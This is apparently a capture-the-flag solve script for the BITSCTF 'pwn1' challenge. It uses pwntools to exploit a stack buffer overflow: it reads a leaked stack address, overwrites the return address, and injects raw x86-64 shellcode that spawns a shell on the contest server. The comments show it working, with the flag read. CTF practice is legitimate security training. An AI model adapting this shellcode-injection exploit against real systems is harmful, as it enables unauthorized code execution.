
from pwn import *
import re

DEBUG = 0

if DEBUG == 1:
    conn = process('./pwn1')
else:
    conn = remote('bitsctf.bits-quark.org' ,1330)


# for gdb debug
raw_input()

log.info('[+]leak stack_addr')

line = conn.recvline()
print line
ret_addr =  int(line,16)
print hex(ret_addr)

exploit = "A"*24
exploit += p64(ret_addr+0x28)

exploit += "AAAAAAAA"+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"




conn.send(exploit+'\n')
# change interactive mode
conn.interactive()


'''
$ python solve_pwn1.py
[+] Opening connection to bitsctf.bits-quark.org on port 1330: Done

[*] [+]leak stack_addr
0x7fffffffe620

0x7fffffffe620
[*] Switching to interactive mode
$
$
$ ls
flag
nohup.out
pwn1
$ cat flag
BITSCTF{b451c_57r416h7_f0rw4rd_5h3llc0d1n6}
[*] Got EOF while reading in interactive
$

'''
